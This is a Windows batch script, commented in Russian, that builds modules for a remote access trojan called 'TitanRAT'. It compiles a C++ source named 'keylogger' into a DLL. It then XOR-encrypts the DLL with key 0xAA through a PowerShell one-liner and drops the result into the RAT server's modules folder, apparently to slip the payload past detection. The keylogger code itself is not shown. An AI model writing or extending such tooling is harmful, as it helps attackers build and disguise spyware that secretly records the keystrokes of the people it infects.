@echo off
setlocal enabledelayedexpansion

REM ==========================================
REM  НАСТРОЙКИ МОДУЛЯ (меняйте эти 2 строки)
REM ==========================================
set MODULE_NAME=keylogger
set LIBS=kernel32.lib user32.lib
REM ==========================================

set SOURCE_FILE=%MODULE_NAME%.cpp
set OUTPUT_DLL=%MODULE_NAME%.dll
set OUTPUT_BIN=%MODULE_NAME%.bin
set DEST_DIR=..\..\Server\modules
set XOR_KEY=0xAA

echo ========================================
echo  [TitanRAT] Module Builder: %MODULE_NAME%
echo ========================================
echo.

REM 1. Найти vcvars64.bat
set "VCVARS="
set "VS_PATH="

if exist "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat" (
    set "VCVARS=C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
    goto :found
)
if exist "C:\Program Files\Microsoft Visual Studio\2022\Professional\VC\Auxiliary\Build\vcvars64.bat" (
    set "VCVARS=C:\Program Files\Microsoft Visual Studio\2022\Professional\VC\Auxiliary\Build\vcvars64.bat"
    goto :found
)
if exist "C:\Program Files\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvars64.bat" (
    set "VCVARS=C:\Program Files\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvars64.bat"
    goto :found
)
if exist "C:\Program Files (x86)\Microsoft Visual Studio\2019\BuildTools\VC\Auxiliary\Build\vcvars64.bat" (
    set "VCVARS=C:\Program Files (x86)\Microsoft Visual Studio\2019\BuildTools\VC\Auxiliary\Build\vcvars64.bat"
    goto :found
)

echo [!] Visual Studio C++ tools not found. Install VS 2022/2019 with C++ workload.
pause
exit /b 1

:found
echo [1/3] Initializing MSVC environment...
call "%VCVARS%" >nul 2>&1
if errorlevel 1 (
    echo [!] Failed to initialize MSVC environment.
    pause
    exit /b 1
)
echo [+] Environment ready.

REM 2. Компиляция
echo [2/3] Compiling %SOURCE_FILE% -> %OUTPUT_DLL%...
cl /LD /MT /O2 %SOURCE_FILE% /Fe:%OUTPUT_DLL% %LIBS%
if errorlevel 1 (
    echo [!] Compilation failed.
    pause
    exit /b 1
)
if not exist %OUTPUT_DLL% (
    echo [!] DLL file not created.
    pause
    exit /b 1
)
echo [+] %OUTPUT_DLL% compiled successfully.

REM 3. Папка назначения
if not exist "%DEST_DIR%" mkdir "%DEST_DIR%"

REM 4. Шифрование (XOR 0xAA) и экспорт
echo [3/3] Encrypting -> %DEST_DIR%\%OUTPUT_BIN%...
powershell -Command "$d=[IO.File]::ReadAllBytes('%OUTPUT_DLL%'); for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i] -bxor %XOR_KEY%}; [IO.File]::WriteAllBytes('%DEST_DIR%\%OUTPUT_BIN%',$d)"
if errorlevel 1 (
    echo [!] Encryption/Export failed.
    pause
    exit /b 1
)

echo.
echo [+] SUCCESS: %OUTPUT_BIN% is ready in %DEST_DIR%
echo ========================================
pause